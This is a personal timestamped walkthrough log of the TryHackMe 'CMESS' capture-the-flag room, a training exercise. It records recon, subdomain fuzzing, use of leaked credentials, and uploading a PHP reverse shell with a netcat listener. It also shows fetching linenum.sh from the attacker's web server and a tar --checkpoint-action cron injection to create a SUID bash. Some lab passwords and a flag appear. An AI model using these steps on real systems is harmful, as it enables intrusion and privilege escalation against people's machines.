```

CMESS https://tryhackme.com/room/cmess

https://tryhackme.com/room/cmess
Bangerbang1223!!
```

```
2:02 PM 1/8/2023 ping 10.10.214.100
```

```
2:02 PM 1/8/2023 nmap -sC -sV -Pn 10.10.214.100

	Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 19:03 EST
	Nmap scan report for 10.10.214.100
	Host is up (0.21s latency).
	Not shown: 998 closed tcp ports (conn-refused)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
	|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
	|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-generator: Gila CMS
	| http-robots.txt: 3 disallowed entries 
	|_/src/ /themes/ /lib/
	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 27.66 seconds
```

```                                                 
2:05 PM 1/8/2023 http://10.10.214.100
	CMS server
```

```	
2:05 PM 1/8/2023 wget https://github.com/maurosoria/dirsearch 
# had to redownload  dirsearch
```

```
2:07 PM 1/8/2023 dirsearch -u http://10.10.214.100 -x 400,401,403

Target: http://10.10.214.100/

	[19:08:24] Starting: 
	[19:08:39] 200 -    4KB - /0
	[19:08:39] 200 -    4KB - /01
	[19:08:39] 200 -    4KB - /1
	[19:08:39] 200 -    4KB - /1.htaccess # HELLOW WORLD
	[19:08:39] 200 -    4KB - /1.htpasswd # HELLOW WORLD
	[19:08:39] 200 -    4KB - /1.php
	[19:08:39] 200 -    4KB - /1.rar
	[19:08:39] 200 -    4KB - /1.txt
	[19:08:39] 200 -    4KB - /1.tar
	[19:08:39] 200 -    4KB - /1.tar.gz
	[19:08:39] 200 -    4KB - /1.sql
	[19:08:39] 200 -    4KB - /1.tar.bz2
	[19:08:39] 200 -    4KB - /1.zip
	[19:08:39] 200 -    4KB - /1c/
	[19:08:39] 200 -    4KB - /1admin   # CAN GET TO ADMIN PAGE
	[19:08:39] 200 -    4KB - /1x1
	[19:08:41] 200 -    3KB - /About
	[19:08:44] 200 -    4KB - /Search
	[19:08:48] 200 -    3KB - /about
	[19:08:50] 200 -    2KB - /admin
	[19:08:51] 200 -    2KB - /admin/
	[19:08:51] 200 -    2KB - /admin/.config
	[19:08:51] 200 -    2KB - /admin/?/login
	[19:08:51] 200 -    2KB - /admin/.htaccess
	[19:08:51] 200 -    2KB - /admin/_logs/access-log
	[19:08:51] 200 -    2KB - /admin/_logs/err.log
	[19:08:51] 200 -    2KB - /admin/_logs/error-log
	[19:08:51] 200 -    2KB - /admin/_logs/error.log
	[19:08:51] 200 -    2KB - /admin/_logs/error_log
	[19:08:51] 200 -    2KB - /admin/access.log
	[19:08:51] 200 -    2KB - /admin/_logs/login.txt
	[19:08:51] 200 -    2KB - /admin/access_log
	[19:08:51] 200 -    2KB - /admin/access.txt
	[19:08:51] 200 -    2KB - /admin/account.php
	[19:08:51] 200 -    2KB - /admin/account.jsp
	[19:08:51] 200 -    2KB - /admin/account.aspx
	[19:08:51] 200 -    2KB - /admin/account.js
	[19:08:51] 200 -    2KB - /admin/account.html
	[19:08:51] 200 -    2KB - /admin/admin-login
	[19:08:51] 200 -    2KB - /admin/admin-login.php
	[19:08:51] 200 -    2KB - /admin/admin-login.jsp
	[19:08:51] 200 -    2KB - /admin/admin-login.aspx
	[19:08:51] 200 -    2KB - /admin/admin.php
	[19:08:51] 200 -    2KB - /admin/admin-login.html
	[19:08:51] 200 -    2KB - /admin/admin-login.js
	[19:08:51] 200 -    2KB - /admin/admin.jsp
	[19:08:51] 200 -    2KB - /admin/admin.aspx
	[19:08:51] 200 -    2KB - /admin/admin.html
	[19:08:51] 200 -    2KB - /admin/admin.js
	[19:08:51] 200 -    2KB - /admin/admin/login
	[19:08:51] 200 -    2KB - /admin/_logs/access_log
	[19:08:51] 200 -    2KB - /admin/admin_login.php
	[19:08:51] 200 -    2KB - /admin/admin_login
	[19:08:51] 200 -    2KB - /admin/_logs/access.log
	[19:08:51] 200 -    2KB - /admin/admin_login.aspx
	[19:08:51] 200 -    2KB - /admin/admin_login.jsp
	[19:08:51] 200 -    2KB - /admin/admin_login.html
	[19:08:51] 200 -    2KB - /admin/adminLogin
	[19:08:51] 200 -    2KB - /admin/admin_login.js
	[19:08:51] 200 -    2KB - /admin/adminLogin.php
	[19:08:51] 200 -    2KB - /admin/adminLogin.aspx
	[19:08:51] 200 -    2KB - /admin/account
	[19:08:52] 200 -    2KB - /admin/adminLogin.html
	[19:08:52] 200 -    2KB - /admin/adminLogin.jsp
	[19:08:52] 200 -    2KB - /admin/adminLogin.js
	[19:08:52] 200 -    2KB - /admin/backup/
	[19:08:52] 200 -    2KB - /admin/admin
	[19:08:52] 200 -    2KB - /admin/backups/
	[19:08:52] 200 -    2KB - /admin/config.php
	[19:08:52] 200 -    2KB - /admin/controlpanel
	[19:08:52] 200 -    2KB - /admin/controlpanel.php
	[19:08:52] 200 -    2KB - /admin/controlpanel.aspx
	[19:08:52] 200 -    2KB - /admin/controlpanel.jsp
	[19:08:52] 200 -    2KB - /admin/controlpanel.html
	[19:08:52] 200 -    2KB - /admin/controlpanel.js
	[19:08:52] 200 -    2KB - /admin/cp.aspx
	[19:08:52] 200 -    2KB - /admin/cp.php
	[19:08:52] 200 -    2KB - /admin/cp
	[19:08:52] 200 -    2KB - /admin/cp.js
	[19:08:52] 200 -    2KB - /admin/cp.jsp
	[19:08:52] 200 -    2KB - /admin/cp.html
	[19:08:52] 200 -    2KB - /admin/db/
	[19:08:52] 200 -    2KB - /admin/default
	[19:08:52] 200 -    2KB - /admin/default.asp
	[19:08:52] 200 -    2KB - /admin/default/admin.asp
	[19:08:52] 200 -    2KB - /admin/default/login.asp
	[19:08:52] 200 -    2KB - /admin/download.php
	[19:08:52] 200 -    2KB - /admin/error.txt
	[19:08:52] 200 -    2KB - /admin/dumper/
	[19:08:52] 200 -    2KB - /admin/error.log
	[19:08:52] 200 -    2KB - /admin/export.php
	[19:08:52] 200 -    2KB - /admin/error_log
	[19:08:52] 200 -    2KB - /admin/FCKeditor
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php
	[19:08:52] 200 -    2KB - /admin/file.php
	[19:08:52] 200 -    2KB - /admin/files.php
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
	[19:08:52] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php
	[19:08:52] 200 -    2KB - /admin/home.php
	[19:08:52] 200 -    2KB - /admin/home.aspx
	[19:08:52] 200 -    2KB - /admin/home
	[19:08:52] 200 -    2KB - /admin/home.jsp
	[19:08:52] 200 -    2KB - /admin/home.html
	[19:08:52] 200 -    2KB - /admin/home.js
	[19:08:52] 200 -    2KB - /admin/index
	[19:08:52] 200 -    2KB - /admin/includes/configure.php~
	[19:08:52] 200 -    2KB - /admin/index.php
	[19:08:52] 200 -    2KB - /admin/index.aspx
	[19:08:52] 200 -    2KB - /admin/index.js
	[19:08:52] 200 -    2KB - /admin/index.html
	[19:08:52] 200 -    2KB - /admin/index.jsp
	[19:08:52] 200 -    2KB - /admin/js/tiny_mce
	[19:08:52] 200 -    2KB - /admin/js/tiny_mce/
	[19:08:52] 200 -    2KB - /admin/js/tinymce
	[19:08:52] 200 -    2KB - /admin/js/tinymce/
	[19:08:52] 200 -    2KB - /admin/login
	[19:08:52] 200 -    2KB - /admin/log
	[19:08:52] 200 -    2KB - /admin/login.php
	[19:08:52] 200 -    2KB - /admin/login.aspx
	[19:08:52] 200 -    2KB - /admin/login.jsp
	[19:08:52] 200 -    2KB - /admin/login.js
	[19:08:52] 200 -    2KB - /admin/login.html
	[19:08:52] 200 -    2KB - /admin/login.asp
	[19:08:52] 200 -    2KB - /admin/login.do
	[19:08:52] 200 -    2KB - /admin/login.htm
	[19:08:52] 200 -    2KB - /admin/login.py
	[19:08:52] 200 -    2KB - /admin/logs/
	[19:08:52] 200 -    2KB - /admin/logs/access-log
	[19:08:52] 200 -    2KB - /admin/logs/access.log
	[19:08:52] 200 -    2KB - /admin/login.rb
	[19:08:52] 200 -    2KB - /admin/logon.jsp
	[19:08:52] 200 -    2KB - /admin/logs/err.log
	[19:08:52] 200 -    2KB - /admin/logs/access_log
	[19:08:52] 200 -    2KB - /admin/logs/error-log
	[19:08:52] 200 -    2KB - /admin/logs/error.log
	[19:08:52] 200 -    2KB - /admin/logs/error_log
	[19:08:52] 200 -    2KB - /admin/logs/login.txt
	[19:08:52] 200 -    2KB - /admin/manage
	[19:08:52] 200 -    2KB - /admin/manage/login.asp
	[19:08:52] 200 -    2KB - /admin/manage.asp
	[19:08:52] 200 -    2KB - /admin/mysql2/index.php
	[19:08:52] 200 -    2KB - /admin/mysql/   # SQL INJECTGION?
	[19:08:52] 200 -    2KB - /admin/mysql/index.php
	[19:08:52] 200 -    2KB - /admin/phpMyAdmin
	[19:08:52] 200 -    2KB - /admin/phpmyadmin/
	[19:08:52] 200 -    2KB - /admin/phpMyAdmin/
	[19:08:52] 200 -    2KB - /admin/pMA/
	[19:08:52] 200 -    2KB - /admin/phpmyadmin2/index.php
	[19:08:52] 200 -    2KB - /admin/phpmyadmin/index.php
	[19:08:52] 200 -    2KB - /admin/pma/
	[19:08:52] 200 -    2KB - /admin/PMA/index.php
	[19:08:52] 200 -    2KB - /admin/pma/index.php
	[19:08:52] 200 -    2KB - /admin/portalcollect.php?f=http://xxx&t=js
	[19:08:52] 200 -    2KB - /admin/private/logs
	[19:08:52] 200 -    2KB - /admin/scripts/fckeditor
	[19:08:52] 200 -    2KB - /admin/release
	[19:08:52] 200 -    2KB - /admin/signin
	[19:08:52] 200 -    2KB - /admin/secure/logon.jsp
	[19:08:52] 200 -    2KB - /admin/sqladmin/
	[19:08:52] 200 -    2KB - /admin/sysadmin/
	[19:08:52] 200 -    2KB - /admin/tinymce
	[19:08:52] 200 -    2KB - /admin/tiny_mce
	[19:08:52] 200 -    2KB - /admin/upload.php
	[19:08:52] 200 -    2KB - /admin/uploads.php
	[19:08:52] 200 -    2KB - /admin/manage/admin.asp
	[19:08:52] 200 -    2KB - /admin/web/
	[19:08:52] 200 -    2KB - /admin/user_count.txt
	[19:08:52] 200 -    2KB - /admin/phpMyAdmin/index.php
	[19:08:52] 200 -    2KB - /admin/pol_log.txt
	[19:08:52] 200 -    2KB - /admin/sxd/
	[19:09:02] 200 -    0B  - /api
	[19:09:02] 200 -    0B  - /api/2/explore/
	[19:09:02] 200 -    0B  - /api/
	[19:09:02] 200 -    0B  - /api/2/issue/createmeta
	[19:09:02] 200 -    0B  - /api/jsonws/invoke
	[19:09:02] 200 -    0B  - /api/package_search/v4/documentation
	[19:09:02] 200 -    0B  - /api/swagger.yml
	[19:09:02] 200 -    0B  - /api/error_log
	[19:09:02] 200 -    0B  - /api/swagger
	[19:09:02] 200 -    0B  - /api/jsonws
	[19:09:02] 200 -    0B  - /api/login.json
	[19:09:02] 200 -    0B  - /api/swagger-ui.html
	[19:09:02] 200 -    0B  - /api/v1
	[19:09:02] 200 -    0B  - /api/v2
	[19:09:02] 200 -    0B  - /api/v2/helpdesk/discover
	[19:09:02] 200 -    0B  - /api/v3
	[19:09:03] 301 -  326B  - /assets  ->  http://10.10.214.100/assets/?url=assets
	[19:09:03] 200 -  567B  - /assets/
	[19:09:03] 200 -    4KB - /author
	[19:09:05] 200 -    4KB - /blog
	[19:09:05] 200 -    4KB - /blog/
	[19:09:06] 200 -    4KB - /category
	[19:09:16] 200 -  735B  - /feed
	[19:09:20] 200 -    4KB - /index
	[19:09:23] 301 -  320B  - /lib  ->  http://10.10.214.100/lib/?url=lib
	[19:09:23] 301 -  320B  - /lib/tinymce  ->  http://10.10.214.100/lib/tinymce/
	[19:09:23] 301 -  320B  - /log  ->  http://10.10.214.100/log/?url=log
	[19:09:24] 200 -    2KB - /login
	[19:09:24] 200 -    2KB - /login/
	[19:09:24] 200 -    2KB - /login/admin/
	[19:09:24] 200 -    2KB - /login/admin/admin.asp
	[19:09:24] 200 -    2KB - /login/cpanel.php
	[19:09:24] 200 -    2KB - /login/administrator/
	[19:09:24] 200 -    2KB - /login/cpanel.aspx
	[19:09:24] 200 -    2KB - /login/cpanel.jsp
	[19:09:24] 200 -    2KB - /login/cpanel/
	[19:09:24] 200 -    2KB - /login/cpanel.html
	[19:09:24] 200 -    2KB - /login/cpanel.js
	[19:09:24] 200 -    2KB - /login/login
	[19:09:24] 200 -    2KB - /login/index
	[19:09:24] 200 -    2KB - /login/oauth/
	[19:09:24] 200 -    2KB - /login/super
	[19:09:37] 200 -   65B  - /robots.txt
	[19:09:38] 200 -    4KB - /search
	[19:09:40] 301 -  324B  - /sites  ->  http://10.10.214.100/sites/?url=sites
	[19:09:41] 301 -  320B  - /src  ->  http://10.10.214.100/src/?url=src
	[19:09:43] 200 -    4KB - /tag
	[19:09:43] 200 -    3KB - /tags
	[19:09:44] 301 -  326B  - /themes  ->  http://10.10.214.100/themes/?url=themes
	[19:09:44] 301 -  320B  - /tmp  ->  http://10.10.214.100/tmp/?url=tmp
	[19:09:49] 200 -    4KB - /wp-content/plugins/jrss-widget/proxy.php?url=
```

```
2:15 PM 1/8/2023 Analysis shwos its a mysql server - potential sql injection
```

```
2:33 PM 1/8/2023 Couldnt figure it out - walkthrough says to look at subdomains using wfuzz
```

```
2:35 PM 1/8/2023 Google top 5000 sub domains  - https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt
```

```
2:36 PM 1/8/2023: gedit top5000.txt
```

```
2:37 PM 1/8/2023 gedit /etc/hosts # & add cmess.
```

```
2:34 PM 1/8/2023 wfuzz -c -f sub-fighter -w top5000.txt -u 'http://cmess.htm' -H "Host: FUZZ.cmess.thm" --hw 290
	Target: http://cmess.htm/
	Total requests: 4989

	=====================================================================
	ID           Response   Lines    Word       Chars       Payload     
	=====================================================================

	000000019:   200        30 L     104 W      934 Ch      "dev"  
	
	## YOU HAVE TO ADD dev.cmess.thm to /etc/hosts ##
		Added hosts entry
		10.10.214.100	cmess.thm
		10.10.214.100 	dev.cmess.thm
```

```
2:43 PM 1/8/2023 Going to dev.cmess.htm
	Development Log
	andre@cmess.thm

	Have you guys fixed the bug that was found on live?
	support@cmess.thm

	Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
	support@cmess.thm

	Update! We have had to delay the patch due to unforeseen circumstances
	andre@cmess.thm

	That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
	support@cmess.thm

	Your password has been reset. Here: KPFTN_f2yxe%
	

	Credentials above!
```

```
2:45 PM 1/8/2023 Logged in with creds above at cmess.htm/login then had to go to cmess.thm/admin and I was logged in.
```

```
2:54 PM 1/8/2023 With video, found a place to upload a reverse shell under content --> file manager
```

```
2:55 PM 1/8/2023 wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
	just copied raw from website into file
	
	#/usr/s
	Changed Ip address to match tun1 ip address: 10.13.13.125 Port 1234
	
	Uploaded php-reverse-shell.php
```

```
2:59 PM 1/8/2023 nc -lvnp 1234
```

```
2:59 PM 1/8/2023 dirsearch to find where the file went
	2:07 PM 1/8/2023 dirsearch -u http://cmess.thm/admin/fm?f=./ -x 400,401,403
	dirsearch -u http://10.10.214.100/admin/uploads.php
```

```
3:07 PM 1/8/2023 found file in http://10.10.214.100/admin/fm?f=./assets
	going to try to execute http://10.10.214.100/admin/fm?f=./assets/php-reverse-shell.php
	
	Just opened the code, going to watch walkthorugh to see how to execute it
	
	RAN THIS FOR SHELL: http://10.10.214.100/assets/php-reverse-shell.php
```

```
3:12 PM 1/8/2023 on box
	$ whoami
	www-data
	$ id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
	$ cat /etc/crontab
	# /etc/crontab: system-wide crontab
	# Unlike any other crontab you don't have to run the `crontab'
	# command to install the new version when you edit this file
	# and files in /etc/cron.d. These files also have username fields,
	# that none of the other crontabs do.

	SHELL=/bin/sh
	PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

	# m h dom mon dow user	command
	17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
	25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
	47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
	52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
	*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz * ######################## interesting, runs every 2 mins
```

```	
3:17 PM 1/8/2023 $ ls -la /tmp/andre_backup.tar.gz
-rw-r--r-- 1 root root 161 Jan  8 17:16 /tmp/andre_backup.tar.gz
```

```
3:22 PM 1/8/2023 Going back to video to find different way - think im going wrong and need help
```

```
3:34 PM 1/8/2023 To get file from my Kali machine to target i need to host a web server
python3 -m http.server
```

```
3:37 PM 1/8/2023
put linenum.sh in /home/kali/transfer, now to host http server with above command and pull to /tmp directory on cmess website
```

```
3:39 PM 1/8/2023 on cmess terminal

cd /tmp
	wget 10.13.13.125:8000 /home/kali/transfer/linenum.sh linenum.sh # didnt work ABOLUTELY WRONG FORMATTING HELLA SMH
wget http://10.13.13.125/linenum.sh # THIS WORKED. TOOK 30 MINS OF TROUBLESHOOTING.
chmod +x linenum.sh
```

```
3:59 PM 1/8/2023
linenum results of interest:

	[-] Location and Permissions (if accessible) of .bak file(s):
	-rw-r--r-- 1 root root 3020 Feb  6  2020 /etc/apt/sources.bak
	-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak

$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
tried sshing into andres, this was wrong his name is just andre........
			#wrong path
			#need to get into a shell

			echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /opt/.password.bak

			cat /opt/.password.bak

			ls -la /tmp #to see if bash file updated

			/tmp/bash -p # now we are root
			#wrong path
			


ssh andre@10.10.214.100
	UQfsdCB7aAP6

and we're in.
```

```
4:13 PM 1/8/2023
andre@cmess:~$ ls
backup  user.txt
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
andre@cmess:~$ 

back to crontab.
```

```
4:15 PM 1/8/2023
andre@cmess:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/shell.sh   # +s adding suid bit
ls
	note  shell.sh
	andre@cmess:~/backup$ 
chmod +x shell.sh
touch /home/andre/backup/--checkpoint=1 
touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh 
ls -la /tmp # to see if bash is generated in /tmp
```

```
4:31 PM 1/8/2023
bash just populated
running /tmp/bash -p # still not root, unsure what happened.



COME BACK TO THIS BOX.
```


